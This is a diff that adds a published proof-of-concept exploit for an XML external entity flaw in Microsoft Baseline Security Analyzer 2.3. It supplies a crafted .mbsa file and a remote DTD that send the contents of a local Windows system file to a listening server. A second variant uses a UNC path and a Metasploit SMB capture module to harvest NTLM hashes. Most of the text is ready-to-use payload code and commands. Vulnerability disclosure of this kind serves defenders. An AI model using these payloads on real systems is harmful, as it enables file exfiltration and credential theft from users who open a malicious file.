@@ -1,0 +1,52 @@
+# Title: Microsoft Baseline Security Analyzer 2.3 - XML External Entity Injection
+# Date: 2018-09-08
+# Author: John Page (aka hyp3rlinx)
+# Vendor: Microsoft
+# Software link: https://www.microsoft.com/en-us/download/details.aspx?id=7558
+# Software Version: 2.3
+# References: ZDI-CAN-6307
+# References: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-BASELINE-ANALYZER-v2.3-XML-INJECTION.txt
+# References: hyp3rlinx.altervista.org
+
+# Security Issue
+# Microsoft Baseline Security Analyzer allows local files to be exfiltrated to a remote attacker 
+# controlled server if a user opens a specially crafted ".mbsa" file.
+
+# Exploit/POC
+
+# Install MBSA
+# https://www.microsoft.com/en-us/download/details.aspx?id=7558
+
+# 1) "evil.mbsa"
+
+<?xml version="1.0"?>
+<!DOCTYPE fileppe_fingerz [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+# 2) "payload.dtd"
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
+%all;
+
+# When victim attempts open file they get prompted "Do you want to let this app 
+# make changes to your device?" However, it also indicates it is a "verified publisher" namely Microsoft. 
+# After opening the local users files can be exfiltrated to a remote server.
+# Moreover, we can use this to steal NTLM hashes.
+
+# Using Forced Authentication to steal NTLM hashes
+
+# 2) msf > use auxiliary/server/capture/smb
+# msf auxiliary(smb) > exploit -j
+
+"evil.mbsa"
+
+<?xml version="1.0"?>
+<!DOCTYPE fileppe_fingerz [ 
+<!ENTITY % dtd SYSTEM "\\192.168.114.153\unknwonfilez">
+%dtd;]>
+
+# Result: credentials captured by remote sever
